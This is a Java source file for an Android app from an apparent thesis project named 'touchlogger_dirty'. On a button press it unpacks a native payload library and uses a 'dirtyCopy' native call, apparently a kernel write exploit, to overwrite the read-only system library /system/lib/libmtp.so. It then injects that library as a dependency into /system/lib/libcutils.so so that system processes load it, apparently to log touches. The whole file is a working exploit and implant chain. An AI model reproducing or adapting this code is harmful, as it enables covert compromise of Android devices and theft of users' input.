package org.leyfer.thesis.touchlogger_dirty.activity;

import android.app.Activity;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import org.leyfer.thesis.touchlogger_dirty.R;
import org.leyfer.thesis.touchlogger_dirty.utils.NativeUtils;

import java.io.File;

import static org.leyfer.thesis.touchlogger_dirty.utils.FileUtils.unpackAsset;

public class MainActivity extends Activity {

    static {
        System.loadLibrary("dirtycopy");
    }

    public static final String TAG = "TouchLoggeer-dirty";

    public static final String SHARED_PAYLOAD_NAME = "libshared_payload.so";
    public static final String EXEC_PAYLOAD_NAME = "exec_payload";
    public static final String TARGET_LIBRARY_NAME = "libmtp.so";
    public static final String TARGET_LIBRARY_PATH = String.format("/system/lib/%s", TARGET_LIBRARY_NAME);
    public static final String TARGET_INJECTED_PATH = "/system/lib/libcutils.so";
    public static final String TARGET_BINARY_PATH = "/system/bin/app_process32";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Example of a call to a native method
        TextView tv = (TextView) findViewById(R.id.sample_text);
        tv.setText(NativeUtils.stringFromJNI());

        Button button = (Button) findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        String abi;
                        if (android.os.Build.VERSION.SDK_INT
                                >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                            abi = Build.SUPPORTED_ABIS[0];
                        } else {
                            abi = Build.CPU_ABI;
                        }

                        File sharedPayloadPath = unpackAsset(MainActivity.this,
                                String.format("%s/%s", abi, SHARED_PAYLOAD_NAME),
                                SHARED_PAYLOAD_NAME);

                        if (sharedPayloadPath != null) {
                            if (!NativeUtils.dirtyCopy(sharedPayloadPath.getAbsolutePath(),
                                    TARGET_LIBRARY_PATH))
                            {
                                Log.d(TAG, "Unable to copy files!");
                                return;
                            }

                            if (!NativeUtils.injectDependencyIntoLinrary(TARGET_INJECTED_PATH,
                                    TARGET_LIBRARY_NAME)) {
                                Log.d(TAG, "Unable to inject dependency into system library!");
                                return;
                            }
                        }

                        Log.d(TAG, "Copy finished!");


                    }
                }).start();
            }
        });
    }

}
